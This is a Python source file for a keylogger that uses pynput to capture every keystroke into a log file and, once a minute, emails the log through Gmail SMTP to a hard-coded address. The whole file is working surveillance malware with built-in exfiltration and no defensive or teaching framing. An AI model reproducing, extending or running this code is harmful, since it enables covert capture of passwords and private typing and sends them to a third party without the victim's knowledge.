from pynput.keyboard import Key, Listener
from email.message import EmailMessage
import smtplib
import time
import datetime

timestamp=datetime.datetime.now().strftime("%Y-%m-%d, %H:%M:%S")

class KeyLogger:
    def __init__(self):
        self.microsecond=0
        self.start_time = time.time()
        self.shift = False
        self.caps = False
        file=open("D:/flutter/app/lib/log.txt", "a")
        file.write("---------------------\n")
        file.write(str(timestamp)+"\n")
        file.write("---------------------\n")
        file.close()
       

    def send_email(self):
        with open("D:/flutter/app/lib/log.txt", "r") as file:
            data = file.read()
            
        server = smtplib.SMTP("smtp.gmail.com", 587) 
        
        server.starttls() 
        server.ehlo() 





        server.login("hrgroove.mk@gmail.com", "") 
        
        email_message = EmailMessage()
        email_message["subject"] = "Keylogger Data"
        email_message["From"] = "hrgroove.mk@gmail.com"
        email_message["to"] = "hrgroove.mk@gmail.com"
        
        email_message.set_content(str(data))
        
        server.send_message(email_message) 
        server.close() 

        self.start_time = time.time()
            
    def log_key(self, key):
        with open("D:/flutter/app/lib/log.txt", "a") as file:
            if time.time() - self.start_time > 60:
                self.send_email()
                # file.write("\n"+str(timestamp)+"\n")
             

            if key == Key.space or key == Key.enter:
                 file.write("\n----------------------")
                 file.write("\n"+str(timestamp)+"\n\n")
            
            if key == Key.backspace :
                 file.write("backspace")
              
                 
                
            
            elif key == Key.shift:
                if not self.shift:
                    self.shift = True

            elif key == Key.caps_lock:
                if not self.caps:
                    self.caps = True
                else:
                    self.caps = False
  
            else:
                try:
                    # if key.char.isalpha():
                    #     if self.caps or self.shift:
                    #         file.write(key.char.upper())

                    #     else:
                    #         file.write(key.char)
        
                    # elif key.char.isdigit():
                    #     if self.shift:
                    #         file.write(self.specials[key.char])
                            
                    #     else:
                    #         file.write(key.char)

                    # else:
                    file.write(key.char)
                                
                except:
                    pass
       
         

        

    def check_shift(self, key):
        if key == Key.shift:
            self.shift = False
    # def on_release(key):
    #     if key == Key.esc:
    #         return False

key_logger = KeyLogger()  

with Listener(on_press=key_logger.log_key, on_release=key_logger.check_shift) as listener:
    listener.join()



